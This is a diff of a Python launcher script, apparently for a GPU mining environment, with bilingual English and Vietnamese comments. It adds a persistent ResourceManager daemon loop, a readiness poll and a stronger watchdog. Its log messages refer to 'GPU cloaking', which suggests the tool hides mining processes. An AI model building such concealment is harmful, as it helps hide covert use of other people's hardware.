@@ -913,11 +913,41 @@ def start_resource_manager_thread():
         if ready:
             thread_logger.info("✅ [PHASE 3] ResourceManager fully ready - safe to start GPU processes")
             thread_logger.info("🎯 [PHASE 3] ResourceManager is now accepting PID handoffs from DirectPIDRegistry")
-            return resource_manager
         else:
             thread_logger.error("❌ [PHASE 3] ResourceManager readiness timeout - continuing with warnings")
             thread_logger.error("🚨 [PHASE 3] GPU processes may experience race conditions without ready ResourceManager")
-            return resource_manager  # Return anyway but with warnings
+        
+        # **🥇 TIER 1 FIX: Add Persistent Daemon Loop** (thêm vòng lặp daemon liên tục)
+        thread_logger.info("🔄 [TIER-1] Starting persistent ResourceManager daemon loop...")
+        
+        # **Store ResourceManager instance globally for access** (lưu trữ ResourceManager instance toàn cục để truy cập)
+        import sys
+        current_module = sys.modules[__name__]
+        current_module._active_resource_manager = resource_manager
+        
+        # **Persistent Service Loop** (vòng lặp dịch vụ liên tục)
+        while not stop_event.is_set():
+            try:
+                # **Monitor ResourceManager health** (giám sát sức khỏe ResourceManager)
+                if hasattr(resource_manager, 'shared_resource_manager') and resource_manager.shared_resource_manager:
+                    # **Log periodic status** (ghi log trạng thái định kỳ)
+                    if hasattr(resource_manager, '_last_health_log'):
+                        if time.time() - resource_manager._last_health_log > 300:  # Every 5 minutes
+                            thread_logger.info("💓 [TIER-1] ResourceManager daemon still active and monitoring")
+                            resource_manager._last_health_log = time.time()
+                    else:
+                        resource_manager._last_health_log = time.time()
+                        thread_logger.info("💓 [TIER-1] ResourceManager daemon initialized with health monitoring")
+                
+                # **Sleep to prevent CPU spinning** (ngủ để tránh CPU quay không)
+                time.sleep(1.0)
+                
+            except Exception as daemon_error:
+                thread_logger.error(f"⚠️ [TIER-1] ResourceManager daemon loop error: {daemon_error}")
+                time.sleep(5.0)  # Longer sleep on error
+        
+        thread_logger.info("🔚 [TIER-1] ResourceManager daemon loop terminated by stop_event")
+        return resource_manager
             
     except Exception as e:
         thread_logger.error(f"❌ [PHASE 3] Resource Manager Thread failed: {e}")
@@ -968,16 +998,45 @@ def main():
     # ------------------------------------------------------------------
     logger.info("🔧 [PHASE 3] Starting Enhanced Resource Manager với readiness validation...")
     
-    # **🥉 SOLUTION 3: Enhanced ResourceManager with Health Monitoring** (ResourceManager nâng cao với giám sát sức khỏe)
-    logger.info("🏥 [SOLUTION-3] Starting ResourceManager with health monitoring system...")
+    # **🥇 TIER 1 FIX: Enhanced ResourceManager with Direct Instance Storage** (ResourceManager nâng cao với lưu trữ instance trực tiếp)
+    logger.info("🏥 [TIER-1] Starting ResourceManager with direct instance management...")
     
-    # **Start ResourceManager in background thread** (khởi động ResourceManager trong background thread)
+    # **TIER 1 FIX: Store ResourceManager instance globally** (lưu trữ ResourceManager instance toàn cục)
+    global _active_resource_manager_instance
+    _active_resource_manager_instance = None
+    
+    # **TIER 1 FIX: Wrapper function to capture return value** (hàm wrapper để bắt return value)
+    def capture_resource_manager():
+        global _active_resource_manager_instance
+        try:
+            _active_resource_manager_instance = start_resource_manager_thread()
+            logger.info(f"🎯 [TIER-1] ResourceManager instance captured: {_active_resource_manager_instance is not None}")
+            return _active_resource_manager_instance
+        except Exception as e:
+            logger.error(f"❌ [TIER-1] Failed to capture ResourceManager: {e}")
+            return None
+    
+    # **Start ResourceManager with instance capture** (khởi động ResourceManager với bắt instance)
     resource_manager_thread_obj = threading.Thread(
-        target=lambda: start_resource_manager_thread(),
+        target=capture_resource_manager,
         daemon=True,
         name="EnhancedResourceManagerThread"
     )
     resource_manager_thread_obj.start()
+    
+    # **TIER 1 FIX: Wait for ResourceManager initialization** (chờ khởi tạo ResourceManager)
+    logger.info("⏳ [TIER-1] Waiting for ResourceManager initialization...")
+    initialization_timeout = 20.0  # 20 seconds timeout
+    start_wait = time.time()
+    
+    while time.time() - start_wait < initialization_timeout:
+        if _active_resource_manager_instance is not None:
+            logger.info("✅ [TIER-1] ResourceManager instance successfully initialized")
+            break
+        time.sleep(0.5)
+    else:
+        logger.error("❌ [TIER-1] ResourceManager initialization timeout - continuing with warnings")
+        logger.error("🚨 [TIER-1] GPU cloaking may not function properly without ResourceManager")
     
     # **🥉 SOLUTION 3: Start Health Monitoring Thread** (khởi động thread giám sát sức khỏe)
     health_monitor_thread_obj = threading.Thread(
@@ -987,16 +1046,38 @@ def main():
     )
     health_monitor_thread_obj.start()
     
-    # **Wait for ResourceManager thread to complete initialization** (chờ ResourceManager thread hoàn thành khởi tạo)
-    logger.info("⏳ [SOLUTION-3] Waiting for ResourceManager thread completion...")
-    resource_manager_thread_obj.join(timeout=20.0)  # Give 20 seconds for complete startup
+    # **🥇 TIER 1 FIX: Replace join() with readiness waiting** (thay thế join() bằng chờ sẵn sàng)
+    logger.info("⏳ [TIER-1] Waiting for ResourceManager readiness instead of thread completion...")
     
-    if resource_manager_thread_obj.is_alive():
-        logger.info("✅ [SOLUTION-3] ResourceManager thread is running persistently (EXPECTED for Solution 1)")
-        logger.info("🔄 [SOLUTION-3] Health monitor will track ResourceManager thread status")
+    # **Wait for ResourceManager to be ready, not for thread to complete** (chờ ResourceManager sẵn sàng, không chờ thread hoàn thành)
+    ready_timeout = 20.0
+    ready_start_time = time.time()
+    
+    while time.time() - ready_start_time < ready_timeout:
+        try:
+            # **Check if ResourceManager is initialized and ready** (kiểm tra ResourceManager đã khởi tạo và sẵn sàng)
+            from mining_environment.scripts.resource_manager import ResourceManager
+            if ResourceManager._instance and ResourceManager.is_ready():
+                logger.info("✅ [TIER-1] ResourceManager is ready and accepting handoffs")
+                logger.info("🎯 [TIER-1] DirectPIDRegistry can now forward PIDs to ResourceManager")
+                break
+        except ImportError:
+            pass  # ResourceManager not yet importable
+        except Exception as check_error:
+            logger.debug(f"🔍 [TIER-1] ResourceManager readiness check error: {check_error}")
+        
+        time.sleep(0.5)  # Check every 500ms
     else:
-        logger.warning("⚠️ [SOLUTION-3] ResourceManager thread completed unexpectedly - health monitor active")
-        logger.warning("🚨 [SOLUTION-3] May indicate initialization failure - check logs")
+        logger.warning("⚠️ [TIER-1] ResourceManager readiness timeout - proceeding with caution")
+        logger.warning("🚨 [TIER-1] PID handoffs may fail until ResourceManager becomes ready")
+    
+    # **Verify thread is still alive (should be persistent)** (xác minh thread vẫn sống)
+    if resource_manager_thread_obj.is_alive():
+        logger.info("✅ [TIER-1] ResourceManager thread is running persistently as daemon")
+        logger.info("🔄 [TIER-1] Health monitor will track ResourceManager thread status")
+    else:
+        logger.error("❌ [TIER-1] ResourceManager thread died unexpectedly during startup")
+        logger.error("🚨 [TIER-1] This indicates critical initialization failure")
     
     # **PHASE 3: Final readiness check before GPU process start** (kiểm tra sẵn sàng cuối cùng trước khi start GPU process)
     logger.info("🔍 [PHASE 3] Final ResourceManager readiness verification...")
@@ -1175,15 +1256,15 @@ def main():
 
 def start_resource_manager_health_monitor(resource_manager_thread):
     """
-    **🥉 SOLUTION 3: ResourceManager Health Monitor** (giám sát sức khỏe ResourceManager)
+    **TIER 3 FIX: Enhanced ResourceManager Health Monitor** (giám sát sức khỏe ResourceManager nâng cao)
     
-    Watchdog system cho ResourceManager thread với automatic restart capability.
+    Watchdog system cho ResourceManager thread với automatic restart capability và enhanced SharedResourceManager monitoring.
     
     Args:
         resource_manager_thread: Threading.Thread object của ResourceManager
     """
     monitor_logger = logging.getLogger('start_mining.health_monitor')
-    monitor_logger.info("🏥 [HEALTH-MONITOR] ResourceManager health monitoring started")
+    monitor_logger.info("🏥 [TIER-3] Enhanced ResourceManager health monitoring started")
     
     # **🥉 SOLUTION 3: Health Check Configuration** (cấu hình kiểm tra sức khỏe)
     check_interval = 30.0  # Check every 30 seconds
@@ -1211,27 +1292,43 @@ def start_resource_manager_health_monitor(resource_manager_thread):
             # **🥉 SOLUTION 3: Thread Health Check** (kiểm tra sức khỏe thread)
             thread_alive = resource_manager_thread.is_alive() if resource_manager_thread else False
             
-            # **🥉 SOLUTION 3: ResourceManager Instance Health Check** (kiểm tra sức khỏe instance ResourceManager)
+            # **TIER 3 FIX: Enhanced ResourceManager Instance Health Check** (kiểm tra sức khỏe instance ResourceManager nâng cao)
             rm_instance_healthy = False
             rm_ready = False
+            rm_shared_manager_healthy = False
             
             try:
                 from mining_environment.scripts.resource_manager import ResourceManager
                 rm_instance = ResourceManager._instance
                 rm_instance_healthy = rm_instance is not None
                 rm_ready = ResourceManager.is_ready() if rm_instance_healthy else False
+                
+                # **TIER 3 FIX: Critical SharedResourceManager health check** (kiểm tra sức khỏe SharedResourceManager quan trọng)
+                if rm_instance_healthy:
+                    rm_shared_manager_healthy = (hasattr(rm_instance, 'shared_resource_manager') and 
+                                                rm_instance.shared_resource_manager is not None)
+                    
+                    if not rm_shared_manager_healthy:
+                        monitor_logger.error(f"❌ [TIER-3] CRITICAL: ResourceManager exists but SharedResourceManager is None!")
+                        monitor_logger.error(f"🔍 [TIER-3] This is the ROOT CAUSE of cloaking failures!")
+                        
             except Exception as rm_check_error:
-                monitor_logger.debug(f"🔍 [HEALTH-MONITOR] ResourceManager instance check error: {rm_check_error}")
+                monitor_logger.error(f"❌ [TIER-3] ResourceManager instance check error: {rm_check_error}")
             
-            # **🥉 SOLUTION 3: Overall Health Assessment** (đánh giá sức khỏe tổng thể)
-            overall_healthy = thread_alive and rm_instance_healthy and rm_ready
+            # **TIER 3 FIX: Enhanced Overall Health Assessment** (đánh giá sức khỏe tổng thể nâng cao)
+            overall_healthy = thread_alive and rm_instance_healthy and rm_ready and rm_shared_manager_healthy
             
             if overall_healthy:
                 health_stats['healthy_checks'] += 1
-                monitor_logger.debug(f"✅ [HEALTH-MONITOR] ResourceManager healthy - thread: {thread_alive}, instance: {rm_instance_healthy}, ready: {rm_ready}")
+                monitor_logger.debug(f"✅ [TIER-3] ResourceManager fully healthy - thread: {thread_alive}, instance: {rm_instance_healthy}, ready: {rm_ready}, shared_manager: {rm_shared_manager_healthy}")
             else:
                 health_stats['unhealthy_checks'] += 1
-                monitor_logger.warning(f"⚠️ [HEALTH-MONITOR] ResourceManager unhealthy - thread: {thread_alive}, instance: {rm_instance_healthy}, ready: {rm_ready}")
+                monitor_logger.error(f"❌ [TIER-3] ResourceManager unhealthy - thread: {thread_alive}, instance: {rm_instance_healthy}, ready: {rm_ready}, shared_manager: {rm_shared_manager_healthy}")
+                
+                # **TIER 3 FIX: Detailed diagnosis for SharedResourceManager** (chẩn đoán chi tiết cho SharedResourceManager)
+                if rm_instance_healthy and rm_ready and not rm_shared_manager_healthy:
+                    monitor_logger.error(f"🚨 [TIER-3] DIAGNOSIS: ResourceManager started but SharedResourceManager initialization failed!")
+                    monitor_logger.error(f"🔍 [TIER-3] This will cause ALL cloaking operations to fail silently!")
                 
                 # **🥉 SOLUTION 3: Automatic Restart Logic** (logic khởi động lại tự động)
                 if (restart_attempts < max_restart_attempts and 
